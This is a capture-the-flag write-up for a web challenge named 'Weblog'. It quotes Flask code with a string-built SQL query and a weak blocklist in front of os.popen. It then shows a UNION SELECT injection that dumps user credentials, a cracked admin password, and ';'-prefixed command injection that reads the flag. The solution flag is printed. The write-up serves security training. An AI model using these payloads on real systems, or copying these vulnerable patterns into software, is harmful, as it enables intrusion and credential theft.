## Name: Weblog
#### Author: @HuskyHacks
#### Category: Web
#### Difficulty: medium
#### Description: Web-LOG? We-BLOG? Webel-OGG? No idea how this one is pronounced. It's on the web, it's a log, it's a web-log, it's a blog. Just roll with it. The challenge source code is available in the challenge.zip folder. The password is snyk-ftf-2025.


## Procedure
I have created my username and after read the source code, we can find the following interesting code in the file ```challenge/app/routes/search.py```:
```
    query = request.args.get("q", "")

    posts = []
    if query:
        try:
            raw_query = text(
                f"SELECT * FROM blog_posts WHERE title LIKE '%{query}%'")
            current_app.logger.info(f"Executing Raw Query: {raw_query}")
            posts = db.session.execute(raw_query).fetchall()
            current_app.logger.info(f"Query Results: {posts}")

            if not posts:
                flash("No results found for your search.", "danger")
            else:
                flash(
                    f"Found {len(posts)} results for your search.", "success")
        except Exception as e:
            current_app.logger.error(f"Query Error: {e}")
            flash(
                f"An error occurred while processing your search: {e}", "danger")
    else:
        flash("Please enter a search term.", "info")

    return render_template("search.html", posts=posts, query=query)
```
The query parameter is not validated correctly, this can allow a SQLi attack, We can check this using a simple ```'``` in the search option, and the database return an error.

![Screenshot 2025-03-05 at 8 37 58 AM](https://github.com/user-attachments/assets/c46ed162-4139-4316-915e-bea4e6a854f6)


using this we can check how many columns return the query ```using order by``` command. It return an error with ```order by 6``` but run correctly with ```order by 5```, so the database is returning only 5 columns.

![Screenshot 2025-03-05 at 8 38 49 AM](https://github.com/user-attachments/assets/7509a38a-359b-4449-a437-4fd1db6f4819)

![Screenshot 2025-03-05 at 8 39 02 AM](https://github.com/user-attachments/assets/a30883ad-7a3d-46ee-a135-ee34fad87964)

from here we can use ```union select``` to recover admin password from users table. ```' union select 1,2,3,username,password from users #```.

![Screenshot 2025-03-05 at 8 45 52 AM](https://github.com/user-attachments/assets/5fbc0da4-dcdc-4a41-bb0e-55def17a32aa)

We got the hash for admin account, now we try to crack it using [hashes.com](https://hashes.com/en/decrypt/hash), we have recovered the password ```no1trust```

<img width="1170" alt="Screenshot 2025-03-05 at 8 46 24 AM" src="https://github.com/user-attachments/assets/1560dbaa-aeb7-4f80-8586-37120e6b8d85" />


Now we have access to admin panel.

![Screenshot 2025-03-05 at 8 46 51 AM](https://github.com/user-attachments/assets/195dba97-3bae-47bb-aa73-6b1086a46ca5)


checking the file ```challenge/app/routes/admin.py``` we can see the following.

```

DEFAULT_COMMAND = "echo 'Rebuilding database...' && /entrypoint.sh"

DISALLOWED_CHARS = r"[&|><$\\]"


@admin_blueprint.route("/admin", methods=["GET", "POST"])
def admin_panel():
    if session.get("role") != "admin":
        flash("Admin access required.", "danger")
        return redirect(url_for("auth.dashboard"))

    user_count = User.query.count()
    post_count = BlogPost.query.count()

    config_message = None
    error_message = None

    if request.method == "POST":
        command = request.form.get("command", "").strip()

        if not command.startswith(DEFAULT_COMMAND):
            error_message = "Invalid command: does not start with the default operation."
        elif re.search(DISALLOWED_CHARS, command[len(DEFAULT_COMMAND):]):
            error_message = "Invalid command: contains disallowed characters."
        else:
            try:
                result = os.popen(command).read()
                config_message = f"Command executed successfully:\n{result}"
            except Exception as e:
                error_message = f"An error occurred: {str(e)}"

    return render_template(
        "admin_panel.html",
        config_message=config_message,
        error_message=error_message,
        DEFAULT_COMMAND=DEFAULT_COMMAND,
        user_count=user_count,
        post_count=post_count,
    )

```
It runs the commands ```echo 'Rebuilding database...' && /entrypoint.sh``` in the background, and check if the commands start with that. We can see a blacklist with the chars ```&|><$\```, we cant use them to run another command, but we can use ```;```, so just check with ```;ls```.

![Screenshot 2025-03-05 at 8 47 24 AM](https://github.com/user-attachments/assets/247bb9a2-458e-4cc7-8170-368736bc32b4)

From here we just need to send the command ```;cat flag``` to recover it.

![Screenshot 2025-03-05 at 8 47 52 AM](https://github.com/user-attachments/assets/fc44ba7c-1864-4882-9401-e8bfda7a346e)



Flag ```flag{b06fbe98752ab13d0fb8414fb55940f3}```
